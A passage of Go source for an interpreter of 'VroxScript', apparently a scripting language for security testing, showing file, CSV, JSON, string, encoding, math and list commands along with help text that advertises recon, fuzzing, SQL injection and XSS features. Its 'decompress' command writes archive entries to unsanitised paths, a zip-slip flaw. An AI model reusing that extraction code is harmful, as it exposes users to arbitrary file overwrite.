	case strings.HasPrefix(line, "filesize "): filename := resolveValue(line[9:], variables); info, err := os.Stat(filename); if err == nil { size := strconv.FormatInt(info.Size(), 10) + " bytes"; variables["filesize_result"] = size; fmt.Println(size) }
	case strings.HasPrefix(line, "filetype "): filename := resolveValue(line[9:], variables); ext := filepath.Ext(filename); variables["filetype_result"] = ext; fmt.Println(ext)
	case strings.HasPrefix(line, "filename "): path := resolveValue(line[9:], variables); base := filepath.Base(path); variables["filename_result"] = base; fmt.Println(base)
	case strings.HasPrefix(line, "dirname "): path := resolveValue(line[8:], variables); dir := filepath.Dir(path); variables["dirname_result"] = dir; fmt.Println(dir)
	case line == "currentdir": dir, _ := os.Getwd(); variables["currentdir"] = dir; fmt.Println(dir)
	case line == "homedir": dir, _ := os.UserHomeDir(); variables["homedir"] = dir; fmt.Println(dir)

	case strings.HasPrefix(line, "compress "): parts := strings.Fields(line[9:]); if len(parts) == 2 { zipFile, err := os.Create(resolveValue(parts[1], variables)); if err == nil { w := zip.NewWriter(zipFile); filepath.Walk(resolveValue(parts[0], variables), func(path string, info os.FileInfo, err error) error { if err != nil || info.IsDir() { return nil }; f, _ := w.Create(path); data, _ := os.ReadFile(path); f.Write(data); return nil }); w.Close(); zipFile.Close(); vroxSuccess("[compress] Done") } }
	case strings.HasPrefix(line, "decompress "): parts := strings.Fields(line[11:]); if len(parts) == 2 { r, err := zip.OpenReader(resolveValue(parts[0], variables)); if err == nil { os.MkdirAll(resolveValue(parts[1], variables), 0755); for _, f := range r.File { rc, _ := f.Open(); outPath := resolveValue(parts[1], variables) + "/" + f.Name; outFile, _ := os.Create(outPath); io.Copy(outFile, rc); outFile.Close(); rc.Close() }; r.Close(); vroxSuccess("[decompress] Done") } }

	// ---- CSV ----
	case strings.HasPrefix(line, "csvread "): filename := resolveValue(line[8:], variables); f, err := os.Open(filename); if err == nil { defer f.Close(); reader := csv.NewReader(f); records, _ := reader.ReadAll(); rows := []string{}; for _, record := range records { rows = append(rows, strings.Join(record, ",")); fmt.Println(COLORS["CYAN"] + strings.Join(record, " | ") + COLORS["RESET"]) }; variables["csv_result"] = rows }
	case strings.HasPrefix(line, "csvwrite "): parts := strings.SplitN(line[9:], " ", 2); if len(parts) == 2 { f, err := os.Create(resolveValue(parts[0], variables)); if err == nil { w := csv.NewWriter(f); for _, row := range strings.Split(resolveExpression(parts[1], variables), "\n") { w.Write(strings.Split(row, ",")) }; w.Flush(); f.Close(); vroxSuccess("[csvwrite] Done") } }

	// ---- JSON ----
	case strings.HasPrefix(line, "jsonparse "): varName := strings.TrimSpace(line[10:]); var result interface{}; err := json.Unmarshal([]byte(fmt.Sprint(variables[varName])), &result); if err == nil { variables["json_result"] = result; formatted, _ := json.MarshalIndent(result, "", "  "); fmt.Println(string(formatted)) } else { fmt.Println(COLORS["RED"] + "[json] Error: " + err.Error() + COLORS["RESET"]) }
	case strings.HasPrefix(line, "jsonget "): parts := strings.Fields(line[8:]); if len(parts) == 2 { var result map[string]interface{}; err := json.Unmarshal([]byte(fmt.Sprint(variables[parts[0]])), &result); if err == nil { val := fmt.Sprint(result[strings.Trim(parts[1], "\"")]); variables["jsonget_result"] = val; fmt.Println(val) } }

	// ---- STRING OPERATIONS ----
	case strings.HasPrefix(line, "upper "): val := resolveExpression(line[6:], variables); variables["upper_result"] = strings.ToUpper(val); fmt.Println(strings.ToUpper(val))
	case strings.HasPrefix(line, "lower "): val := resolveExpression(line[6:], variables); variables["lower_result"] = strings.ToLower(val); fmt.Println(strings.ToLower(val))
	case strings.HasPrefix(line, "trim "): val := resolveExpression(line[5:], variables); variables["trim_result"] = strings.TrimSpace(val); fmt.Println(strings.TrimSpace(val))
	case strings.HasPrefix(line, "strlen "): val := resolveExpression(line[7:], variables); variables["strlen_result"] = strconv.Itoa(len(val)); fmt.Println(len(val))
	case strings.HasPrefix(line, "contains "): parts := strings.SplitN(line[9:], " ", 2); if len(parts) == 2 { result := strings.Contains(resolveExpression(parts[0], variables), resolveExpression(parts[1], variables)); variables["contains_result"] = strconv.FormatBool(result); fmt.Println(result) }
	case strings.HasPrefix(line, "startswith "): parts := strings.SplitN(line[11:], " ", 2); if len(parts) == 2 { result := strings.HasPrefix(resolveExpression(parts[0], variables), resolveExpression(parts[1], variables)); variables["startswith_result"] = strconv.FormatBool(result); fmt.Println(result) }
	case strings.HasPrefix(line, "endswith "): parts := strings.SplitN(line[9:], " ", 2); if len(parts) == 2 { result := strings.HasSuffix(resolveExpression(parts[0], variables), resolveExpression(parts[1], variables)); variables["endswith_result"] = strconv.FormatBool(result); fmt.Println(result) }
	case strings.HasPrefix(line, "split "): parts := strings.SplitN(line[6:], " by ", 2); if len(parts) == 2 { result := strings.Split(resolveExpression(parts[0], variables), strings.Trim(parts[1], "\"")); variables["split_result"] = result; fmt.Println(result) }
	case strings.HasPrefix(line, "replace "): parts := strings.Fields(line[8:]); if len(parts) == 3 { result := strings.ReplaceAll(resolveExpression(parts[0], variables), strings.Trim(parts[1], "\""), strings.Trim(parts[2], "\"")); variables["replace_result"] = result; fmt.Println(result) }
	case strings.HasPrefix(line, "join "): parts := strings.SplitN(line[5:], " with ", 2); if len(parts) == 2 { if items, ok := variables[strings.TrimSpace(parts[0])].([]string); ok { result := strings.Join(items, strings.Trim(strings.TrimSpace(parts[1]), "\"")); variables["join_result"] = result; fmt.Println(result) } }
	case strings.HasPrefix(line, "index "): parts := strings.Fields(line[6:]); if len(parts) == 2 { idx, _ := strconv.Atoi(resolveValue(parts[1], variables)); if items, ok := variables[parts[0]].([]string); ok && idx < len(items) { variables["index_result"] = items[idx]; fmt.Println(items[idx]) } }
	case strings.HasPrefix(line, "slice "): parts := strings.Fields(line[6:]); if len(parts) == 3 { val := resolveExpression(parts[0], variables); start, _ := strconv.Atoi(resolveValue(parts[1], variables)); end, _ := strconv.Atoi(resolveValue(parts[2], variables)); if end > len(val) { end = len(val) }; result := val[start:end]; variables["slice_result"] = result; fmt.Println(result) }
	case strings.HasPrefix(line, "find "): parts := strings.SplitN(line[5:], " in ", 2); if len(parts) == 2 { idx := strings.Index(resolveExpression(parts[1], variables), resolveExpression(parts[0], variables)); variables["find_result"] = strconv.Itoa(idx); fmt.Println(idx) }
	case strings.HasPrefix(line, "pad "): parts := strings.Fields(line[4:]); if len(parts) == 2 { val := resolveExpression(parts[0], variables); length, _ := strconv.Atoi(resolveValue(parts[1], variables)); for len(val) < length { val = val + " " }; variables["pad_result"] = val; fmt.Println(val) }
	case strings.HasPrefix(line, "reverse_str "): val := resolveExpression(line[12:], variables); runes := []rune(val); for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 { runes[i], runes[j] = runes[j], runes[i] }; result := string(runes); variables["reverse_str_result"] = result; fmt.Println(result)
	case strings.HasPrefix(line, "repeat_str "): parts := strings.Fields(line[11:]); if len(parts) == 2 { str := resolveExpression(parts[0], variables); count, _ := strconv.Atoi(resolveValue(parts[1], variables)); result := strings.Repeat(str, count); variables["repeat_str_result"] = result; fmt.Println(result) }
	case strings.HasPrefix(line, "count_str "): parts := strings.SplitN(line[10:], " in ", 2); if len(parts) == 2 { sub := resolveExpression(parts[0], variables); str := resolveExpression(parts[1], variables); count := strings.Count(str, sub); variables["count_str_result"] = strconv.Itoa(count); fmt.Println(count) }
	case strings.HasPrefix(line, "between "): parts := strings.Fields(line[8:]); if len(parts) == 3 { str := resolveExpression(parts[0], variables); start := strings.Trim(parts[1], "\""); end := strings.Trim(parts[2], "\""); startIdx := strings.Index(str, start); if startIdx >= 0 { startIdx += len(start); endIdx := strings.Index(str[startIdx:], end); if endIdx >= 0 { result := str[startIdx : startIdx+endIdx]; variables["between_result"] = result; fmt.Println(result) } } }

	// ---- ENCODING ----
	case strings.HasPrefix(line, "encode "): val := resolveExpression(line[7:], variables); result := base64.StdEncoding.EncodeToString([]byte(val)); variables["encode_result"] = result; fmt.Println(result)
	case strings.HasPrefix(line, "decode "): val := resolveExpression(line[7:], variables); decoded, err := base64.StdEncoding.DecodeString(val); if err == nil { variables["decode_result"] = string(decoded); fmt.Println(string(decoded)) }
	case strings.HasPrefix(line, "urlencode "): val := resolveExpression(line[10:], variables); result := url.QueryEscape(val); variables["urlencode_result"] = result; fmt.Println(result)
	case strings.HasPrefix(line, "urldecode "): val := resolveExpression(line[10:], variables); result, _ := url.QueryUnescape(val); variables["urldecode_result"] = result; fmt.Println(result)
	case strings.HasPrefix(line, "md5 "): val := resolveExpression(line[4:], variables); hash := md5.Sum([]byte(val)); result := fmt.Sprintf("%x", hash); variables["md5_result"] = result; fmt.Println(result)
	case strings.HasPrefix(line, "sha256 "): val := resolveExpression(line[7:], variables); hash := sha256.Sum256([]byte(val)); result := fmt.Sprintf("%x", hash); variables["sha256_result"] = result; fmt.Println(result)
	case strings.HasPrefix(line, "tonum "): val := resolveExpression(line[6:], variables); num, err := strconv.ParseFloat(val, 64); if err == nil { variables["tonum_result"] = num; fmt.Println(num) }
	case strings.HasPrefix(line, "tostr "): val := resolveValue(line[6:], variables); variables["tostr_result"] = fmt.Sprint(val); fmt.Println(val)

	// ---- MATH ----
	case strings.HasPrefix(line, "math "): result := evalMath(line[5:], variables); variables["math_result"] = strconv.FormatFloat(result, 'f', -1, 64); fmt.Println(result)
	case strings.HasPrefix(line, "abs "): val, _ := strconv.ParseFloat(resolveValue(line[4:], variables), 64); result := math.Abs(val); variables["abs_result"] = strconv.FormatFloat(result, 'f', -1, 64); fmt.Println(result)
	case strings.HasPrefix(line, "floor "): val, _ := strconv.ParseFloat(resolveValue(line[6:], variables), 64); result := int(math.Floor(val)); variables["floor_result"] = strconv.Itoa(result); fmt.Println(result)
	case strings.HasPrefix(line, "ceil "): val, _ := strconv.ParseFloat(resolveValue(line[5:], variables), 64); result := int(math.Ceil(val)); variables["ceil_result"] = strconv.Itoa(result); fmt.Println(result)
	case strings.HasPrefix(line, "round "): parts := strings.Fields(line[6:]); if len(parts) >= 1 { val, _ := strconv.ParseFloat(resolveValue(parts[0], variables), 64); decimals := 0; if len(parts) > 1 { decimals, _ = strconv.Atoi(parts[1]) }; factor := math.Pow(10, float64(decimals)); result := math.Round(val*factor) / factor; variables["round_result"] = strconv.FormatFloat(result, 'f', decimals, 64); fmt.Println(result) }
	case strings.HasPrefix(line, "sqrt "): val, _ := strconv.ParseFloat(resolveValue(line[5:], variables), 64); result := math.Sqrt(val); variables["sqrt_result"] = strconv.FormatFloat(result, 'f', -1, 64); fmt.Println(result)
	case strings.HasPrefix(line, "power "): parts := strings.Fields(line[6:]); if len(parts) == 2 { base, _ := strconv.ParseFloat(resolveValue(parts[0], variables), 64); exp, _ := strconv.ParseFloat(resolveValue(parts[1], variables), 64); result := math.Pow(base, exp); variables["power_result"] = strconv.FormatFloat(result, 'f', -1, 64); fmt.Println(result) }
	case strings.HasPrefix(line, "max "): parts := strings.Fields(line[4:]); maxVal := math.Inf(-1); for _, p := range parts { val, err := strconv.ParseFloat(resolveValue(p, variables), 64); if err == nil && val > maxVal { maxVal = val } }; variables["max_result"] = strconv.FormatFloat(maxVal, 'f', -1, 64); fmt.Println(maxVal)
	case strings.HasPrefix(line, "min "): parts := strings.Fields(line[4:]); minVal := math.Inf(1); for _, p := range parts { val, err := strconv.ParseFloat(resolveValue(p, variables), 64); if err == nil && val < minVal { minVal = val } }; variables["min_result"] = strconv.FormatFloat(minVal, 'f', -1, 64); fmt.Println(minVal)
	case strings.HasPrefix(line, "sum "): varName := strings.TrimSpace(line[4:]); total := 0.0; if items, ok := variables[varName].([]string); ok { for _, item := range items { val, err := strconv.ParseFloat(item, 64); if err == nil { total += val } } }; variables["sum_result"] = strconv.FormatFloat(total, 'f', -1, 64); fmt.Println(total)
	case strings.HasPrefix(line, "avg "): varName := strings.TrimSpace(line[4:]); total := 0.0; count := 0; if items, ok := variables[varName].([]string); ok { for _, item := range items { val, err := strconv.ParseFloat(item, 64); if err == nil { total += val; count++ } } }; if count > 0 { avg := total / float64(count); variables["avg_result"] = strconv.FormatFloat(avg, 'f', 2, 64); fmt.Println(avg) }
	case strings.HasPrefix(line, "randint "): parts := strings.Fields(line[8:]); if len(parts) == 2 { min, _ := strconv.Atoi(resolveValue(parts[0], variables)); max, _ := strconv.Atoi(resolveValue(parts[1], variables)); result := rand.Intn(max-min+1) + min; variables["randint_result"] = strconv.Itoa(result); fmt.Println(result) }
	case line == "random": result := rand.Float64(); variables["random_result"] = fmt.Sprint(result); fmt.Println(result)

	// ---- LIST OPERATIONS ----
	case strings.HasPrefix(line, "sort "): varName := strings.TrimSpace(line[5:]); if items, ok := variables[varName].([]string); ok { sorted := make([]string, len(items)); copy(sorted, items); sort.Strings(sorted); variables[varName] = sorted; variables["sort_result"] = sorted; fmt.Println(sorted) }
	case strings.HasPrefix(line, "reverse "): varName := strings.TrimSpace(line[8:]); if items, ok := variables[varName].([]string); ok { reversed := make([]string, len(items)); for i, v := range items { reversed[len(items)-1-i] = v }; variables[varName] = reversed; variables["reverse_result"] = reversed; fmt.Println(reversed) }
	case strings.HasPrefix(line, "unique "): varName := strings.TrimSpace(line[7:]); if items, ok := variables[varName].([]string); ok { seen := map[string]bool{}; unique := []string{}; for _, item := range items { if !seen[item] { seen[item] = true; unique = append(unique, item) } }; variables[varName] = unique; variables["unique_result"] = unique; fmt.Println(unique) }
	case strings.HasPrefix(line, "filter "): parts := strings.SplitN(line[7:], " ", 2); if len(parts) == 2 { varName := parts[0]; keyword := resolveExpression(parts[1], variables); if items, ok := variables[varName].([]string); ok { filtered := []string{}; for _, item := range items { if strings.Contains(strings.ToLower(item), strings.ToLower(keyword)) { filtered = append(filtered, item) } }; variables["filter_result"] = filtered; fmt.Println(filtered) } }
	case strings.HasPrefix(line, "count "): varName := strings.TrimSpace(line[6:]); switch v := variables[varName].(type) { case []string: variables["count_result"] = strconv.Itoa(len(v)); fmt.Println(len(v)); case string: variables["count_result"] = strconv.Itoa(len(v)); fmt.Println(len(v)); default: variables["count_result"] = "0"; fmt.Println(0) }
	case strings.HasPrefix(line, "push "): parts := strings.SplitN(line[5:], " ", 2); if len(parts) == 2 { name := strings.TrimSpace(parts[0]); val := resolveExpression(parts[1], variables); if items, ok := variables[name].([]string); ok { variables[name] = append(items, val) } else { variables[name] = []string{val} } }
	case strings.HasPrefix(line, "pop "): name := strings.TrimSpace(line[4:]); if items, ok := variables[name].([]string); ok && len(items) > 0 { variables[name] = items[:len(items)-1] }
	case strings.HasPrefix(line, "remove "): parts := strings.SplitN(line[7:], " ", 2); if len(parts) == 2 { varName := parts[0]; val := resolveExpression(parts[1], variables); if items, ok := variables[varName].([]string); ok { newItems := []string{}; for _, item := range items { if item != val { newItems = append(newItems, item) } }; variables[varName] = newItems } }
	case strings.HasPrefix(line, "contains_all "): parts := strings.Fields(line[13:]); if len(parts) == 2 { varName := parts[0]; item := resolveExpression(parts[1], variables); found := false; if items, ok := variables[varName].([]string); ok { for _, i := range items { if i == item { found = true; break } } }; variables["contains_all_result"] = strconv.FormatBool(found); fmt.Println(found) }
	case strings.HasPrefix(line, "list "): parts := strings.SplitN(line[5:], "=", 2); if len(parts) == 2 { name := strings.TrimSpace(parts[0]); val := strings.Trim(strings.TrimSpace(parts[1]), "[]"); items := strings.Split(val, ","); result := []string{}; for _, item := range items { result = append(result, strings.TrimSpace(strings.Trim(item, "\""))) }; variables[name] = result }

	case strings.HasPrefix(line, "type "): varName := strings.TrimSpace(line[5:]); if v, ok := variables[varName]; ok { t := fmt.Sprintf("%T", v); variables["type_result"] = t; fmt.Println(t) }
	}
}

func showBanner() {
	fmt.Println(COLORS["PURPLE"] + COLORS["BOLD"] + `
 __   __ ____   ___  __  __
 \ \ / /|  _ \ / _ \|  \/  |
  \ V / | |_) | | | | |\/| |
   | |  |  _ <| |_| | |  | |
   |_|  |_| \_\\___/|_|  |_|
` + COLORS["RESET"])
	fmt.Println(COLORS["CYAN"] + COLORS["BOLD"] + "  VroxScript " + VERSION + " — Security Scripting Language" + COLORS["RESET"])
	fmt.Println(COLORS["GREEN"] + "  github.com/InterviewCopilot350/vroxscript" + COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"] + "  Built by Prince, India" + COLORS["RESET"])
	fmt.Println()
}

func showHelp() {
	showBanner()
	fmt.Println(COLORS["YELLOW"] + "USAGE:" + COLORS["RESET"])
	fmt.Println("  vrox file.vs            Run script")
	fmt.Println("  vrox --debug file.vs    Debug mode")
	fmt.Println("  vrox --version          Version")
	fmt.Println("  vrox --help             Help")
	fmt.Println("  vrox                    Interactive")
	fmt.Println(COLORS["TEAL"] + "\nNEW 2.3 — SECURITY:" + COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  8 passive sources (crt.sh,hackertarget,rapiddns,urlscan,alienvault,virustotal,certspotter,threatbook)"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  DNS permutations automatically generated"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  favicon hash detection"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  CDN detection (cloudflare,akamai,fastly,aws,azure)"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  service banner grabbing"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  ping, cidr expansion"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  POST fuzzing, recursive fuzzing"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  Advanced SQLi (error, time-based, union-based)"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  Advanced XSS (reflected, parameter mining, blind)"+COLORS["RESET"])
	fmt.Println(COLORS["TEAL"]+"  mineParams — automatic parameter discovery"+COLORS["RESET"])
	fmt.Println(COLORS["PURPLE"] + "\nNEW 2.3 — LANGUAGE:" + COLORS["RESET"])
	fmt.Println(COLORS["PURPLE"]+"  switch/case/default"+COLORS["RESET"])
	fmt.Println(COLORS["PURPLE"]+"  unless condition { }"+COLORS["RESET"])
	fmt.Println(COLORS["PURPLE"]+"  loop 10 as i { }"+COLORS["RESET"])
	fmt.Println(COLORS["PURPLE"]+"  assert condition msg"+COLORS["RESET"])
	fmt.Println(COLORS["PURPLE"]+"  raise msg"+COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"] + "\nNEW 2.3 — OUTPUT:" + COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"]+"  table headers data"+COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"]+"  progress 50 100 label"+COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"]+"  spinner msg duration"+COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"]+"  ask question"+COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"]+"  divider"+COLORS["RESET"])
	fmt.Println(COLORS["ORANGE"]+"  now date time elapsed"+COLORS["RESET"])
	fmt.Println(COLORS["GREEN"] + "\nNEW 2.3 — MATH:" + COLORS["RESET"])
	fmt.Println(COLORS["GREEN"]+"  abs floor ceil round sqrt power max min sum avg"+COLORS["RESET"])
	fmt.Println(COLORS["CYAN"] + "\nNEW 2.3 — STRINGS:" + COLORS["RESET"])
	fmt.Println(COLORS["CYAN"]+"  reverse_str repeat_str count_str between"+COLORS["RESET"])
	fmt.Println(COLORS["CYAN"]+"  isnumber isalpha isempty isip isdomain"+COLORS["RESET"])
	fmt.Println(COLORS["CYAN"]+"  isnum isstr isbool isnull islist isdict"+COLORS["RESET"])
	fmt.Println(COLORS["YELLOW"] + "\nNEW 2.3 — FILES:" + COLORS["RESET"])
	fmt.Println(COLORS["YELLOW"]+"  filetype filename dirname currentdir homedir"+COLORS["RESET"])
	fmt.Println(COLORS["YELLOW"] + "\nNEW 2.3 — LISTS:" + COLORS["RESET"])
	fmt.Println(COLORS["YELLOW"]+"  filter remove contains_all"+COLORS["RESET"])
	fmt.Println(COLORS["PINK"] + "\nNEW COLORS:" + COLORS["RESET"])
	fmt.Println(COLORS["VIOLET"]+"violet "+COLORS["CORAL"]+"coral "+COLORS["SILVER"]+"silver "+COLORS["MAROON"]+"maroon "+COLORS["NAVY"]+"navy"+COLORS["RESET"])
}

func showVersion() { showBanner() }

func interactive() {
	showBanner()
	fmt.Println(COLORS["CYAN"] + "Interactive Mode — Type 'exit' to quit\n" + COLORS["RESET"])
	variables := map[string]interface{}{}
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(COLORS["GREEN"] + "vrox> " + COLORS["RESET"])
		line, _ := reader.ReadString('\n')
		line = strings.TrimSpace(line)
		if line == "exit" { fmt.Println(COLORS["CYAN"] + "Bye!" + COLORS["RESET"]); break }
		if line != "" { interpretLine(line, 1, variables, false, "") }
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	scriptStartTime = time.Now()
	if len(os.Args) < 2 { interactive(); return }
	switch os.Args[1] {
	case "--help": showHelp()
	case "--version": showVersion()
	case "--debug":
		if len(os.Args) < 3 { fmt.Println(COLORS["RED"] + "Error: No file" + COLORS["RESET"]); return }
		data, err := os.ReadFile(os.Args[2])
		if err != nil { fmt.Println(COLORS["RED"] + "Error: Cannot open file" + COLORS["RESET"]); return }
		runCode(string(data), map[string]interface{}{}, true)
	default:
		data, err := os.ReadFile(os.Args[1])
		if err != nil { fmt.Println(COLORS["RED"] + "Error: " + os.Args[1] + COLORS["RESET"]); return }
		runCode(string(data), map[string]interface{}{}, false)
	}
}
